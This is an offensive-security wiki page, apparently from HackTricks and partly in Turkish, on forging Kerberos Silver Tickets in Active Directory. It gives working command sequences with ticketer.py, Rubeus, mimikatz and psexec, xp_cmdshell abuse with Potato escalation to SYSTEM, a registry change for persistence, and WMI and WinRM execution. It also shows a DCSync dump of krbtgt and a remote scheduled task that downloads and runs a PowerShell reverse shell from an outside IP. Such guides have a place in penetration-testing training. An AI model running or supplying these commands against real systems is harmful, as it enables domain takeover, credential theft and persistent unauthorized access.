# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** saldırısı, Active Directory (AD) ortamlarındaki service tickets'ın istismarıyla ilgilidir. Bu yöntem, bir computer account gibi bir service account'un **acquiring the NTLM hash of a service account** işlemini gerektirir; bu hash ile bir Ticket Granting Service (TGS) ticket'ı sahte olarak oluşturulur. Bu sahte ticket ile saldırgan, ağdaki belirli servislere erişebilir ve genellikle yönetici ayrıcalıklarını hedefleyerek **impersonating any user** yapabilir. Ticket oluştururken AES keys kullanmanın daha güvenli ve daha az tespit edilebilir olduğu vurgulanır.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

For ticket crafting, different tools are employed based on the operating system:

### Linux'ta
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows'ta
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servisi, hedefin dosya sistemine erişmek için yaygın bir hedef olarak öne çıkar, ancak HOST ve RPCSS gibi diğer servisler de görevler ve WMI sorguları için sömürülebilir.

### Örnek: MSSQL servisi (MSSQLSvc) + Potato ile SYSTEM'e

Eğer bir SQL servis hesabının (ör. sqlsvc) NTLM hash'ine (veya AES anahtarına) sahipseniz, MSSQL SPN için bir TGS sahteleyebilir ve SQL servisine karşı herhangi bir kullanıcıyı taklit edebilirsiniz. Buradan xp_cmdshell'i etkinleştirip SQL servis hesabı olarak komut çalıştırabilirsiniz. Eğer o token SeImpersonatePrivilege'e sahipse, Potato kullanarak SYSTEM'e yükseltebilirsiniz.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Eğer ortaya çıkan bağlamda SeImpersonatePrivilege varsa (genellikle hizmet hesapları için geçerlidir), SYSTEM elde etmek için bir Potato varyantı kullanın:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
MSSQL'i kötüye kullanma ve xp_cmdshell'i etkinleştirme hakkında daha fazla detay:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato tekniklerine genel bakış:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Mevcut Servisler

| Servis Türü                                | Servis Silver Tickets                                                      |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon

## Kalıcılık

Makinelerin parolalarını her 30 günde bir değiştirmelerini önlemek için `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` olarak ayarlayabilirsiniz veya makinelerin parola döndürme süresini göstermek için `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` değerini 30days'den daha büyük bir değere ayarlayabilirsiniz.

## Servis ticket'larının kötüye kullanımı

Aşağıdaki örneklerde ticket'ın administrator hesabı taklidi yapılarak elde edildiğini varsayalım.

### CIFS

Bu ticket ile `C$` ve `ADMIN$` klasörlerine **SMB** üzerinden (eğer açığa çıkmışlarsa) erişebilir ve uzak dosya sistemine dosya kopyalayabilirsiniz, örneğin:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ayrıca konakta bir shell elde edebilir veya **psexec** kullanarak istediğiniz komutları çalıştırabilirsiniz:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### KONAK

Bu izinle uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve istediğiniz komutları çalıştırabilirsiniz:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Bu biletlerle hedef sistemde **WMI çalıştırabilirsiniz**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Aşağıdaki sayfada **wmiexec hakkında daha fazla bilgi** bulun:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Winrm erişimi ile bir bilgisayara **erişebilirsiniz** ve hatta PowerShell elde edebilirsiniz:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Uzak hosta winrm kullanarak bağlanmanın **daha fazla yolunu** öğrenmek için aşağıdaki sayfayı inceleyin:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Erişim için **winrm'in uzak bilgisayarda aktif ve dinliyor olması** gerektiğini unutmayın.

### LDAP

Bu ayrıcalıkla **DCSync** kullanarak DC veritabanını dökebilirsiniz:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync hakkında daha fazla bilgi edinin** aşağıdaki sayfada:


{{#ref}}
dcsync.md
{{#endref}}


## Kaynaklar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
